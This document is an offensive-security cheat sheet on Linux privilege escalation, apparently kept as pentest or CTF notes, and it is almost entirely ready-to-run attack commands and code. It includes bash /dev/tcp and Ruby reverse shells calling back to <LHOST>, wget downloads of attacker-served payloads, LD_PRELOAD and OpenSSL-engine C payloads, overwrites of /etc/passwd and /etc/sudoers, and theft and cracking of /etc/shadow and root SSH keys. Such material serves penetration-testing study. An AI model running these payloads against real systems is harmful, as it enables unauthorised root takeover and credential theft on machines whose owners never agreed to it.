---
title: Linux Privilege Escalation
type: note
tab: Privesc
inputs: [Shell]
outputs: [Root, SUID, SudoRights, Capabilities, Credentials]
tags: [Linux, PrivilegeEscalation]
---

# Linux Privilege Escalation

## Recon & Credentials

### Quick Checks

#Shell #Linux #PrivilegeEscalation
Run a first-pass Linux privesc checklist for system context, sudo, SUID/SGID, capabilities, writable paths, cron, processes, and kernel version.

```sh
# Current user, groups, hostname, and kernel.
id
whoami
hostname
uname -a
uname -r
lscpu

# Home and common web roots.
ls -la /home
ls -la /var/www
ls -la /var/www/html

# Network and interesting root-owned processes.
ss -tulpn
netstat -tulpn
ps aux | grep root
ps aux | grep root | grep -i mysql

# Sudo rights.
sudo -l
sudo --version

# SUID and SGID binaries.
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm /6000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
find / -perm -g=s -type f 2>/dev/null | xargs ls -l

# Linux capabilities and writable locations.
getcap -r / 2>/dev/null
find / -writable -type d 2>/dev/null

# Cron and kernel quick checks.
cat /etc/crontab
ls -la /etc/cron*
searchsploit linux kernel <VERSION>
```

### Automated Audit Scripts

#Shell #Linux #PrivilegeEscalation
Download and run LinPEAS for a fast automated Linux privilege escalation audit.

1. Download `linpeas.sh` on the target.

```sh
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
chmod +x linpeas.sh
```

2. Run a full check.

```sh
./linpeas.sh -a
```

3. Run a faster check.

```sh
./linpeas.sh -s
```

4. Check sudo-related findings.

```sh
./linpeas.sh -P
```

### Credential Hunting

#Shell #Linux #Looting
Search for credentials in config files, shell history, packet captures, and SSH key material.

```sh
# Common web/app config files.
find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null
find / -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 2>/dev/null
locate pass | more

# Bash history.
history
cat /home/<USER>/.bash_history
cat ~/.bash_history | grep -i passw

# Credentials inside tcpdump/pcap captures.
tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='

# SSH keys.
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

### SSH Private Key Reuse

#Shell #PrivateKey #Linux #Looting
Use a discovered SSH private key, then crack it if it is passphrase-protected.

```sh
# Attacker: save the discovered key locally, then lock down permissions.
chmod 600 id_rsa

# Attacker: try key-based login.
ssh -i id_rsa <USER>@<TARGET_IP>

# Attacker: if the key asks for a passphrase, convert and crack it.
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Writable Files

### Writable Password Files

#Shell #Linux #PrivilegeEscalation
Abuse writable `/etc/passwd`, `/etc/shadow`, or `/etc/sudoers` to become root.

```sh
# /etc/passwd option 1: append a UID 0 user with no password.
ls -la /etc/passwd
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
su - root2
id && whoami

# /etc/passwd option 2: replace root with a blank-password root entry.
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
su root
id && whoami

# /etc/shadow: generate a new root hash, then replace root's hash manually.
python -c "import crypt; print(crypt.crypt('NewRootPassword'))"
vi /etc/shadow
su root
id && whoami

# /etc/sudoers: grant your current user full sudo rights.
echo "<USER> ALL=(ALL:ALL) ALL" >> /etc/sudoers
sudo su
id && whoami
```

## Sudo Abuse

### Sudo / GTFOBins

#Shell #Linux #PrivilegeEscalation
Triage `sudo -l`, then check GTFOBins or known sudo CVEs for the allowed binary/version.

```sh
# Check what can run through sudo.
sudo -l
sudo --version

# Search the allowed binary or sudo CVE path manually.
# Useful references:
# - https://gtfobins.github.io/
# - https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics

# If a sudo-allowed GTFOBins entry lets you chmod arbitrary paths.
chmod +s /bin/bash
/bin/bash -p

# If fail2ban-client runs with elevated rights.
fail2ban-client set <JAIL> action <ACTION> actionban "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
```

### Sudo LD_PRELOAD

#Shell #Linux #PrivilegeEscalation
Exploit `env_keep+=LD_PRELOAD` when a sudo-allowed binary preserves `LD_PRELOAD`.

1. Confirm the sudoers environment keeps `LD_PRELOAD`.

```sh
sudo -l
```

2. Create `priv.c` with the preload body.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

3. Compile the preload library on the target after saving the body as `/tmp/priv.c`.

```sh
cd /tmp
gcc -fPIC -shared -o priv.so priv.c -nostartfiles
```

4. Replace `awk` with any sudo-allowed binary from `sudo -l`.

```sh
sudo LD_PRELOAD=/tmp/priv.so awk
id && whoami
```

## SUID / SGID Abuse

### SUID / SGID Discovery

#Shell #Linux #PrivilegeEscalation
Find SUID/SGID binaries, then inspect whether they are exploitable through GTFOBins, relative command execution, or file overwrite.

```sh
# SUID binaries run with the file owner's privileges, often root.
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
find / -uid 0 -perm -4000 -type f 2>/dev/null

# SGID binaries run with the file group's privileges.
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null | xargs ls -l

# Both SUID and SGID.
find / -perm /6000 -type f 2>/dev/null

# Inspect interesting binaries.
file <BIN>
strings <BIN>

# Check GTFOBins for direct abuse paths.
# https://gtfobins.github.io/
```

### SUID PATH Hijack

#Shell #Linux #PrivilegeEscalation
Hijack a SUID binary that calls another command without using a full absolute path.

```sh
# Target: find and inspect a SUID binary.
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
ls -la /path/to/suid_binary
strings /path/to/suid_binary

# Target: if strings shows a relative command such as `ps`, `curl`, or `service`, place a malicious binary first in PATH.
echo '/bin/bash -p' > /tmp/ps
chmod +x /tmp/ps
echo $PATH
export PATH=/tmp:$PATH

# Target: run the vulnerable SUID binary.
/path/to/suid_binary
id && whoami
```

### SUID GTFOBins Examples

#Shell #Linux #PrivilegeEscalation
Use common SUID abuse patterns for `systemctl` or `cp` when those binaries are exploitable in the target context.

1. `systemctl`: create a transient service file with this body.

```ini
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target
```

2. Link and start the service, then use SUID bash.

```sh
TF=$(mktemp).service
vi "$TF"
systemctl link "$TF"
systemctl enable --now "$TF"
/bin/bash -p
id && whoami
```

3. `cp`: generate a password hash and append a UID 0 user locally on the attacker box.

```sh
openssl passwd -1 -salt ignite NewRootPassword
echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> passwd
python -m http.server 9000
```

4. Download and copy the prepared passwd file on the target.

```sh
wget -O /tmp/passwd http://<LHOST>:9000/passwd
cp /tmp/passwd /etc/passwd
su root2
id && whoami
```

## Linux Capabilities

### Capability Discovery

#Shell #Linux #PrivilegeEscalation
Find dangerous Linux capabilities and abuse high-impact ones such as `cap_setuid` or `cap_dac_read_search`.

```sh
# Discover file capabilities.
getcap -r / 2>/dev/null

# Inspect process capabilities if a PID is interesting.
cat /proc/<PID>/status | grep Cap

# High-value examples:
# cap_setuid            -> can switch UID, often direct root shell on interpreters.
# cap_dac_read_search   -> can read files regardless of DAC permissions.
# cap_sys_admin         -> broad privileged capability, investigate carefully.
# cap_net_bind_service  -> can bind low ports, usually not direct privesc by itself.

# Python with cap_setuid.
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

# Perl with cap_setuid.
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
id && whoami

# Tar with cap_dac_read_search: read root-only files.
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow
```

### Capability File Looting

#Shell #Linux #PrivilegeEscalation
Use `cap_dac_read_search` on archive tools to steal root-only credentials or keys.

```sh
# Victim: archive and extract /etc/shadow.
getcap -r / 2>/dev/null
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow

# Attacker: crack copied hashes offline.
john shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Victim: if root SSH key is readable through tar capability.
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
cat root/.ssh/id_rsa

# Attacker: use the copied key.
chmod 600 id_rsa
ssh -i id_rsa root@<TARGET_IP>
id && whoami
```

### OpenSSL Capability Engine

#Shell #Linux #PrivilegeEscalation
Abuse OpenSSL with `cap_setuid` by loading a custom engine that marks `/bin/bash` as SUID.

1. Confirm OpenSSL has `cap_setuid`.

```sh
getcap -r / 2>/dev/null
```

2. Create `priv.c` with this OpenSSL engine body on the attacker box.

```c
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "priv";
static const char *engine_name = "priv";

static int bind(ENGINE *e, const char *id) {
  int ret = 0;
  if (!ENGINE_set_id(e, engine_id)) goto end;
  if (!ENGINE_set_name(e, engine_name)) goto end;
  setuid(0);
  setgid(0);
  system("chmod +s /bin/bash");
  ret = 1;
end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

3. Compile and serve the shared object from the attacker box.

```sh
gcc -fPIC -c priv.c -o priv.o
gcc -shared -o priv.so priv.o -lcrypto
python -m http.server 9000
```

4. Load the engine on the victim and use the SUID bash.

```sh
wget -O /tmp/priv.so http://<LHOST>:9000/priv.so
openssl req -engine /tmp/priv.so
/bin/bash -p
id && whoami
```

## Cron / Scheduled Jobs

### Cron Discovery & Writable Scripts

#Shell #Linux #PrivilegeEscalation
Abuse a root cron job when the called script, working directory, or wildcard path is writable.

```sh
# Target: list cron jobs and scheduled scripts.
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Target: inspect script permissions from cron entries.
ls -la /opt/script.sh

# Target: if a root-run script is writable, append a payload.
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /opt/script.sh

# Attacker: catch the callback.
nc -lvnp <LPORT>

# Target: monitor root-run jobs if pspy is available.
./pspy64
```

### Cron File Overwrite

#Shell #Linux #PrivilegeEscalation
Create or overwrite the file that a root cron job runs, then wait for the scheduled execution.

1. Relative or missing file: create the file where cron resolves it.

```sh
cat /etc/crontab
# Example output: * * * * * root systemupdate.sh
echo 'chmod +s /bin/bash' > /home/<USER>/systemupdate.sh
chmod +x /home/<USER>/systemupdate.sh
```

2. Writable shell script: append a payload to the root-run script.

```sh
cat /etc/crontab
# Example output: * * * * * root /usr/bin/local/network-test.sh
echo 'chmod +s /bin/bash' >> /usr/bin/local/network-test.sh
```

3. Writable Python script: replace the script body with this payload.

```python
import os
os.system("chmod +s /bin/bash")
```

4. Save the Python payload on the target.

```sh
cat /etc/crontab
# Example output: * * * * * root /var/www/html/web-backup.py
vi /var/www/html/web-backup.py
```

5. Wait for cron, then use the SUID bash.

```sh
/bin/bash -p
id && whoami
```

### Tar Checkpoint Cron Abuse

#Shell #Linux #PrivilegeEscalation
Abuse wildcard tar checkpoint options in a writable cron backup directory.

1. Move to the writable backup directory used by the root cron job.

```sh
cd <WRITABLE_BACKUP_DIR>
```

2. Create `shell.sh` with this payload body.

```sh
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

3. Save the payload file and make it executable.

```sh
vi shell.sh
chmod +x shell.sh
```

4. Create tar option files consumed by wildcard expansion.

```sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

5. Wait for cron, then use the SUID bash copy.

```sh
/tmp/rootbash -p
id && whoami
```

### Sudo / SUID Facter

#Shell #Linux #PrivilegeEscalation
Exploit sudo/SUID `facter` with a local shell payload or a reverse shell custom fact.

1. Local shell payload: create `/tmp/facts/shell.rb` with this body.

```ruby
exec "/bin/sh"
```

2. Run `facter` with the custom local shell fact.

```sh
mkdir -p /tmp/facts
vi /tmp/facts/shell.rb
sudo /usr/bin/facter --custom-dir=/tmp/facts x
```

3. Reverse shell payload: create `/tmp/facts/rev.rb` with this body.

```ruby
require "socket"
exit if fork
c = TCPSocket.new("<LHOST>", <LPORT>)
while (cmd = c.gets)
  IO.popen(cmd, "r") { |io| c.print io.read }
end
```

4. Catch the callback, then run `facter` with the reverse shell fact.

```sh
nc -lvnp <LPORT>
mkdir -p /tmp/facts
vi /tmp/facts/rev.rb
sudo /usr/bin/facter --custom-dir=/tmp/facts x
```

### Chkrootkit 0.49

#Shell #Linux #PrivilegeEscalation
Exploit vulnerable `chkrootkit` 0.49 when it runs as root, commonly through cron.

```sh
# Target: confirm scheduled execution and vulnerable version.
cat /etc/cron.daily
which chkrootkit
ls -la /usr/bin/chkrootkit
chkrootkit -V

# Target: create the vulnerable /tmp/update payload used by CVE-2014-0476.
echo '#!/bin/bash' > /tmp/update
echo 'chmod +s /bin/bash' >> /tmp/update
chmod +x /tmp/update

# Target: wait for root execution, then use the SUID bash.
/bin/bash -p
id && whoami
```

## Application / Service Abuse

### MySQL Running As Root

#Shell #Linux #PrivilegeEscalation
If MySQL runs as root and you have MySQL admin access, use the MySQL client to execute OS commands.

```sh
# Target: confirm MySQL is running as root.
ps aux | grep root | grep -i mysql

# Target: connect to MySQL.
mysql -u root -p

# Option 1: set SUID on bash from inside mysql.
\! chmod +s /bin/bash
exit
ls -la /bin/bash
/bin/bash -p
id && whoami

# Option 2: trigger a reverse shell from inside mysql.
\! bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Attacker: catch the callback.
nc -lvnp <LPORT>
id && whoami
```

## Kernel / Last Resort

### Kernel Exploits

#Shell #Linux #PrivilegeEscalation
Treat kernel exploits as a last resort: identify the kernel, research PoCs, read the exploit notes, and test carefully.

```sh
# Target: identify kernel and distro details.
uname -a
uname -r
cat /etc/os-release

# Attacker: search for candidate exploits.
searchsploit linux kernel <VERSION>

# Manual research examples:
# Google: <VERSION> exploit
# Google: <VERSION> PoC GitHub
# Dirty COW: https://dirtycow.ninja/
# Linux kernel exploit collection: https://github.com/SecWiki/linux-kernel-exploits
```

### Memory Trick

`SUDO -> SUID -> WRITE -> CRON -> CREDS -> PATH -> KERNEL`
